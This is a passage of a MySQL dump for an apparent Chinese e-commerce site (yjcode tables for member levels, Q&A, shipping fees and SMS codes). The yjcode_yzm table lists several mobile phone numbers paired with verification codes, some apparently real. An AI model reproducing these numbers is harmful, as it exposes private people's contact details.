  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(20) DEFAULT NULL,
  `name1` char(40) DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `zhekou` float DEFAULT NULL,
  `money1` int(10) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `jgdw` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `yjcode_userdj`
--

INSERT INTO `yjcode_userdj` (`id`, `bh`, `name1`, `xh`, `sj`, `zhekou`, `money1`, `zt`, `jgdw`) VALUES
(2, '1488456761d30', '普通会员', 1, '2017-03-02 20:13:03', 10, 0, 0, 0),
(3, '1510690980d62', '高级VIP', 2, '2017-11-15 04:23:21', 7, 20, 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_wenda`
--

CREATE TABLE IF NOT EXISTS `yjcode_wenda` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `probh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `selluserid` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `hfsj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `txt` text,
  `hftxt` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_yunfei`
--

CREATE TABLE IF NOT EXISTS `yjcode_yunfei` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `tit` char(50) DEFAULT NULL,
  `cityid` text,
  `money1` float DEFAULT NULL,
  `money2` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `yjcode_yunfei`
--

INSERT INTO `yjcode_yunfei` (`id`, `bh`, `tit`, `cityid`, `money1`, `money2`, `sj`, `userid`, `zt`) VALUES
(2, '1511154772y15', 'dfdd', NULL, 10, 1, '2017-11-20 13:13:06', 15, 0);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_yzm`
--

CREATE TABLE IF NOT EXISTS `yjcode_yzm` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `tit` char(50) DEFAULT NULL,
  `yzm` char(20) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `yjcode_yzm`
--

INSERT INTO `yjcode_yzm` (`id`, `tit`, `yzm`, `admin`) VALUES
(1, '15777777777', '965614', 1),
(2, '13113629361', '018925', 1),
(3, '18878982761', '294347', 1),
(4, '17687635523', '904475', 1);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
